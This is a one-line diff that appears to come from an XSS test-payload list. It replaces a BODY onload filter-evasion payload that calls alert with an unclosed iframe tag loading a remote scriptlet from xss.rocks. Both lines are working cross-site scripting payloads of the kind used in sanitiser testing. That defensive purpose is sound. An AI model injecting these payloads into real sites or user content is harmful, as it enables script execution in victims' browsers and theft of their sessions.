@@ -1,1 +1,1 @@
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<iframe src=http://xss.rocks/scriptlet.html <
